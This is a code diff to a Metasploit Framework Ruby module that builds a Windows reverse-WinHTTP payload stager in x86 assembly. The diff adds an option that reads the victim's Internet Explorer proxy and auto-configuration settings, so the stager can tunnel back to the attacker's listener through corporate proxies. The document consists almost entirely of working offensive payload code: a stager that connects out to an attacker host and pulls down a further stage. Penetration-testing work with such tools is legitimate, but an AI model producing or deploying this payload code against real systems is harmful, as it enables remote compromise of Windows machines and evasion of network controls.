@@ -1,9 +1,6 @@
 # -*- coding: binary -*-
 
 require 'msf/core'
-require 'msf/core/payload/transport_config'
-require 'msf/core/payload/windows/block_api'
-require 'msf/core/payload/windows/exitfunk'
 require 'msf/core/payload/windows/reverse_http'
 
 module Msf
@@ -16,8 +13,17 @@ module Msf
 
 module Payload::Windows::ReverseWinHttp
 
-  include Msf::Payload::TransportConfig
   include Msf::Payload::Windows::ReverseHttp
+
+  #
+  # Register reverse_winhttp specific options
+  #
+  def initialize(*args)
+    super
+    register_advanced_options([
+        OptBool.new('PayloadProxyIE', [false, 'Enable use of IE proxy settings', true])
+      ], self.class)
+  end
 
   #
   # Generate the first stage
@@ -25,14 +31,13 @@ module Payload::Windows::ReverseWinHttp
   def generate(opts={})
     conf = {
       ssl:         opts[:ssl] || false,
-      host:        datastore['LHOST'],
-      port:        datastore['LPORT'],
-      retry_count: datastore['StagerRetryCount']
+      host:        datastore['LHOST'] || '127.127.127.127',
+      port:        datastore['LPORT']
     }
 
     # Add extra options if we have enough space
     unless self.available_space.nil? || required_space > self.available_space
-      conf[:url]              = generate_uri
+      conf[:uri]              = generate_uri
       conf[:exitfunk]         = datastore['EXITFUNC']
       conf[:verify_cert_hash] = opts[:verify_cert_hash]
       conf[:proxy_host]       = datastore['PayloadProxyHost']
@@ -41,9 +46,10 @@ module Payload::Windows::ReverseWinHttp
       conf[:proxy_pass]       = datastore['PayloadProxyPass']
       conf[:proxy_type]       = datastore['PayloadProxyType']
       conf[:retry_count]      = datastore['StagerRetryCount']
+      conf[:proxy_ie]         = datastore['PayloadProxyIE']
     else
       # Otherwise default to small URIs
-      conf[:url]              = generate_small_uri
+      conf[:uri]              = generate_small_uri
     end
 
     generate_reverse_winhttp(conf)
@@ -107,7 +113,7 @@ module Payload::Windows::ReverseWinHttp
   # Generate an assembly stub with the configured feature set and options.
   #
   # @option opts [Bool] :ssl Whether or not to enable SSL
-  # @option opts [String] :url The URI to request during staging
+  # @option opts [String] :uri The URI to request during staging
   # @option opts [String] :host The host to connect to
   # @option opts [Fixnum] :port The port to connect to
   # @option opts [String] :verify_cert_hash A 20-byte raw SHA-1 hash of the certificate to verify, or nil
@@ -119,8 +125,21 @@ module Payload::Windows::ReverseWinHttp
     retry_count       = [opts[:retry_count].to_i, 1].max
     verify_ssl        = nil
     encoded_cert_hash = nil
-    encoded_url       = asm_generate_wchar_array(opts[:url])
+    encoded_uri       = asm_generate_wchar_array(opts[:uri])
     encoded_host      = asm_generate_wchar_array(opts[:host])
+
+    # this is used by the IE proxy functionality when an autoconfiguration URL
+    # is specified. We need the full URL otherwise the call to resolve the proxy
+    # for the URL doesn't work.
+    full_url = 'http'
+    full_url << 's' if opts[:ssl]
+    full_url << '://' << opts[:host]
+    full_url << ":#{opts[:port]}" if opts[:ssl] && opts[:port] != 443
+    full_url << ":#{opts[:port]}" if !opts[:ssl] && opts[:port] != 80
+    full_url << opts[:uri]
+
+    encoded_full_url = asm_generate_wchar_array(full_url)
+    encoded_uri_index = full_url.rindex('/') * 2
 
     if opts[:ssl] && opts[:verify_cert_hash]
       verify_ssl = true
@@ -165,6 +184,14 @@ module Payload::Windows::ReverseWinHttp
       http_open_flags = (
         0x00000100 ) # WINHTTP_FLAG_BYPASS_PROXY_CACHE
     end
+
+    ie_proxy_autodect = (
+      0x00000001 | # WINHTTP_AUTO_DETECT_TYPE_DHCP
+      0x00000002 ) # WINHTTP_AUTO_DETECT_TYPE_DNS_A
+
+    ie_proxy_flags = (
+      0x00000001 | # WINHTTP_AUTOPROXY_AUTO_DETECT
+      0x00000002 ) # WINHTTP_AUTOPROXY_CONFIG_URL
 
     asm = %Q^
       ; Input: EBP must be the address of 'api_call'.
@@ -220,14 +247,34 @@ module Payload::Windows::ReverseWinHttp
       ^
     end
 
+    if opts[:proxy_ie] == true && !proxy_enabled
+      asm << %Q^
+        push eax               ; Session handle is required later for ie proxy
+      ^
+    end
+
     asm << %Q^
       WinHttpConnect:
         push ebx               ; Reserved (NULL)
         push #{opts[:port]}    ; Port [3]
         call got_server_uri    ; Double call to get pointer for both server_uri and
       server_uri:              ; server_host; server_uri is saved in edi for later
-        db #{encoded_url}
+      ^
+
+    if opts[:proxy_ie] == true && !proxy_enabled
+      asm << %Q^
+        db #{encoded_full_url}
       got_server_host:
+        add edi, #{encoded_uri_index} ; move edi up to where the URI starts
+      ^
+    else
+      asm << %Q^
+        db #{encoded_uri}
+      got_server_host:
+      ^
+    end
+
+    asm << %Q^
         push eax               ; Session handle returned by WinHttpOpen
         push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpConnect')}
         call ebp
@@ -276,6 +323,86 @@ module Payload::Windows::ReverseWinHttp
         push esi               ; hRequest
         push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetCredentials')}
         call ebp
+      ^
+    elsif opts[:proxy_ie] == true
+      asm << %Q^
+        ; allocate space for WINHTTP_CURRENT_USER_IE_PROXY_CONFIG, which is
+        ; a 16-byte structure
+        sub esp, 16
+        mov eax, esp           ; store a pointer to the buffer
+        push edi               ; store the current URL in case it's needed
+        mov edi, eax           ; put the buffer pointer in edi
+        push edi               ; Push a pointer to the buffer
+        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpGetIEProxyConfigForCurrentUser')}
+        call ebp
+
+        test eax, eax          ; skip the rest of the proxy stuff if the call failed
+        jz ie_proxy_setup_finish
+
+        ; we don't care about the "auto detect" flag, as it doesn't seem to
+        ; impact us at all.
+
+        ; if auto detect isn't on, check if there's an auto configuration URL
+        mov eax, [edi+4]
+        test eax, eax
+        jz ie_proxy_manual
+
+        ; restore the URL we need to reference
+        pop edx
+        sub edx, #{encoded_uri_index} ; move edx up to where the full URL starts
+
+        ; set up the autoproxy structure on the stack
+        push 1                 ; fAutoLogonIfChallenged (1=TRUE)
+        push ebx               ; dwReserved (0)
+        push ebx               ; lpReserved (NULL)
+        push eax               ; lpszAutoConfigUrl
+        push #{ie_proxy_autodect} ; dwAutoDetectFlags
+        push #{ie_proxy_flags} ; dwFlags
+        mov eax, esp
+
+        ; prepare space for the resulting proxy info structure
+        sub esp, 12
+        mov edi, esp           ; store the proxy pointer
+
+        ; prepare the WinHttpGetProxyForUrl call
+        push edi               ; pProxyInfo
+        push eax               ; pAutoProxyOptions
+        push edx               ; lpcwszUrl
+        lea eax, [esp+64]      ; Find the pointer to the hSession - HACK!
+        push [eax]             ; hSession
+        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpGetProxyForUrl')}
+        call ebp
+
+        test eax, eax          ; skip the rest of the proxy stuff if the call failed
+        jz ie_proxy_setup_finish
+        jmp set_ie_proxy       ; edi points to the filled out proxy structure
+
+      ie_proxy_manual:
+        ; check to see if a manual proxy is specified, if not, we skip
+        mov eax, [edi+8]
+        test eax, eax
+        jz ie_proxy_setup_finish
+
+        ; manual proxy present, set up the proxy info structure by patching the
+        ; existing current user IE structure that is in edi
+        push 4
+        pop eax
+        add edi, eax           ; skip over the fAutoDetect flag
+        dec eax
+        mov [edi], eax         ; set dwAccessType (3=WINHTTP_ACCESS_TYPE_NAMED_PROXY)
+
+        ; fallthrough to set the ie proxy
+
+      set_ie_proxy:
+        ; we assume that edi is going to point to the proxy options
+        push 12                ; dwBufferLength (sizeof proxy options)
+        push edi               ; lpBuffer (pointer to the proxy)
+        push 38                ; dwOption (WINHTTP_OPTION_PROXY)
+        push esi               ; hRequest
+        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetOption')}
+        call ebp
+
+      ie_proxy_setup_finish:
       ^
     end
 
